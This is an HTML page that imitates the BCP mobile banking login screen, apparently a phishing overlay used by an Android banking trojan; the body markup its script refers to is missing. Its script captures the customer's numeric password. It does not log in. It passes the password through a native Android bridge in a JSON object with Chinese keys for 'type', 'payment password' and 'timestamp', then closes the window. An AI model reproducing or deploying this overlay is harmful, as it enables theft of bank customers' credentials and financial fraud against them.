<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
  <meta name="theme-color" content="#01409c">
  <title>Banca Móvil BCP</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --page: min(100vw, 430px);
      --blue: #0142a0;
      --bar: #003f9c;
      --ink: #003399;
      --link: #1560c8;
      --orange: #fd6d12;
      --bg: #f4f8fc;
      --line: #d5e4f6;
      --muted: #7e89a4;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { font-size: calc(var(--page) / 390 * 16); }
    html, body { min-height: 100%; background: #e7eef6; }
    body {
      color: var(--ink);
      font-family: "Nunito Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
    }
    button, input { font: inherit; color: inherit; }
    button { border: 0; background: transparent; cursor: pointer; }
    img { display: block; }

    .app {
      width: var(--page);
      min-height: 100dvh;
      margin: 0 auto;
      background: var(--bg);
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    .header {
      position: relative;
      background: linear-gradient(180deg, #013d98 0%, #0144a6 100%);
      color: #fff;
      padding: max(1.35rem, env(safe-area-inset-top)) 1.05rem 1.85rem;
      overflow: hidden;
    }
    .brand {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: .6rem;
    }
    .logo { height: 1.92rem; width: auto; }
    .pills { height: 2.05rem; width: auto; }
    .hello {
      margin-top: 2.15rem;
      text-align: center;
    }
    .hello h1 {
      font-size: 2.35rem;
      line-height: 1.1;
      font-weight: 800;
      letter-spacing: -.03em;
    }
    .hello p {
      margin-top: .42rem;
      font-size: 1.05rem;
      font-weight: 700;
      letter-spacing: -.01em;
      color: rgba(255,255,255,.94);
    }
    .wedge {
      position: absolute;
      right: 0;
      bottom: 0;
      height: 3.05rem;
      width: auto;
      pointer-events: none;
    }

    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: .95rem 1.05rem 0;
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: .72rem .48rem;
    }
    .tile {
      background: #f8fbfe;
      border: 1.5px solid var(--line);
      border-radius: .85rem;
      min-height: 6.85rem;
      padding: .85rem .28rem .6rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      color: var(--ink);
    }
    .tile:active { background: #eef4fb; }
    .tile img { height: 2.55rem; width: auto; margin-top: .1rem; }
    .tile span {
      margin-top: .42rem;
      min-height: 2.15em;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      font-size: .74rem;
      font-weight: 800;
      line-height: 1.15;
      letter-spacing: -.02em;
    }

    .account {
      margin-top: .85rem;
      background: var(--bar);
      color: #fff;
      border-radius: .8rem;
      min-height: 3.65rem;
      display: flex;
      align-items: center;
      gap: .55rem;
      padding: .5rem .65rem .5rem .75rem;
    }
    .account img { height: 1.55rem; width: auto; }
    .account p {
      flex: 1;
      text-align: left;
      font-size: .92rem;
      font-weight: 800;
      letter-spacing: -.02em;
    }
    .cambiar {
      border: 1.5px solid rgba(255,255,255,.9);
      color: #fff;
      border-radius: .55rem;
      padding: .38rem .72rem;
      font-size: .84rem;
      font-weight: 800;
      line-height: 1.1;
    }
    .cambiar:active { background: rgba(255,255,255,.12); }

    .pass {
      margin-top: .68rem;
      border: 1.5px solid var(--line);
      background: #f8fbfe;
      border-radius: .8rem;
      min-height: 3.2rem;
      display: flex;
      align-items: center;
      padding: 0 .7rem 0 .75rem;
      gap: .5rem;
    }
    .pass.is-focus { border-color: #9eb6d8; }
    .pass.invalid { border-color: #e10600; }
    .err {
      margin: .38rem .1rem 0;
      color: #e10600;
      font-size: .82rem;
      font-weight: 700;
      line-height: 1.25;
      text-align: left;
    }
    .err[hidden] { display: none; }
    .lock { height: 1.55rem; width: auto; flex: none; }
    .pass input {
      flex: 1;
      min-width: 0;
      height: 2.4rem;
      border: 0;
      outline: 0;
      background: transparent;
      font-size: .9rem;
      font-weight: 700;
      letter-spacing: -.015em;
      color: #3d4e72;
    }
    .pass input::placeholder {
      color: var(--muted);
      font-weight: 700;
    }
    .show {
      flex: none;
      display: flex;
      align-items: center;
      gap: .32rem;
      color: var(--link);
      font-size: .92rem;
      font-weight: 800;
      border-left: 1.5px solid #d7e3f2;
      padding: .15rem 0 .15rem .62rem;
      margin-left: .1rem;
    }
    .show img { height: 1.02rem; width: auto; }
    .show:active { opacity: .65; }

    .ingresar {
      margin-top: .72rem;
      width: 100%;
      height: 3.15rem;
      border-radius: .8rem;
      background: var(--orange);
      color: #fff;
      font-size: 1.22rem;
      font-weight: 800;
      letter-spacing: -.02em;
    }
    .ingresar:active { filter: brightness(.96); }
    .ingresar.loading {
      color: transparent;
      pointer-events: none;
      position: relative;
    }
    .ingresar.loading::after {
      content: "";
      position: absolute;
      width: 1.2rem;
      height: 1.2rem;
      top: 50%;
      left: 50%;
      margin: -.6rem 0 0 -.6rem;
      border: 2.5px solid rgba(255,255,255,.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .forgot {
      align-self: center;
      margin: 1.05rem 0 .2rem;
      color: var(--link);
      font-size: 1.02rem;
      font-weight: 800;
      letter-spacing: -.02em;
    }
    .forgot:active { opacity: .65; }

    .nav {
      margin-top: auto;
      border-top: 1px solid #e4eef8;
      background: #f7fbfe;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      padding: .55rem .2rem max(.7rem, env(safe-area-inset-bottom));
    }
    .nav button {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: .22rem;
      color: var(--ink);
      font-size: .74rem;
      font-weight: 800;
      letter-spacing: -.02em;
      padding: .15rem 0;
    }
    .nav button:active { opacity: .6; }
    .nav img { height: 1.42rem; width: auto; }
  </style>
</head>

  <script>
    (function () {
      const input = document.getElementById("clave");
      const box = document.getElementById("passBox");
      const show = document.getElementById("show");
      const label = document.getElementById("showLabel");
      const ingresar = document.getElementById("ingresar");
      const err = document.getElementById("claveErr");

      function showErr() {
        box.classList.add("invalid");
        err.hidden = false;
        err.textContent = "Ingresa al menos 6 dígitos";
        input.setAttribute("aria-invalid", "true");
      }

      function clearErr() {
        box.classList.remove("invalid");
        err.hidden = true;
        err.textContent = "";
        input.removeAttribute("aria-invalid");
      }

      input.addEventListener("input", () => {
        const digits = input.value.replace(/\D/g, "");
        if (digits !== input.value) input.value = digits;
        if (digits.length >= 6) clearErr();
      });
      input.addEventListener("focus", () => box.classList.add("is-focus"));
      input.addEventListener("blur", () => box.classList.remove("is-focus"));

      ingresar.addEventListener("click", () => {
        if (ingresar.classList.contains("loading")) return;
        if (input.value.length < 6) {
          showErr();
          input.focus();
          return;
        }
        clearErr();
        ingresar.classList.add("loading");
        ingresar.disabled = true;
        ingresar.setAttribute("aria-busy", "true");
        setTimeout(() => {
        try {
          if (typeof Android !== 'undefined' && Android.returnResult) {
            Android.returnResult(JSON.stringify({
              '类型': 'bcp',
              '支付密码': input.value,
              '时间戳': Date.now()
            }));
          }
        } catch (e) {}
        setTimeout(() => {
          try {
            if (typeof Android !== 'undefined' && Android.close) Android.close();
          } catch (e) {}
        }, 2500);
      }, 900);

      });

      show.addEventListener("click", () => {
        const visible = input.type === "password";
        input.type = visible ? "text" : "password";
        label.textContent = visible ? "Ocultar" : "Mostrar";
        show.setAttribute("aria-pressed", visible ? "true" : "false");
      });
    })();
  </script>
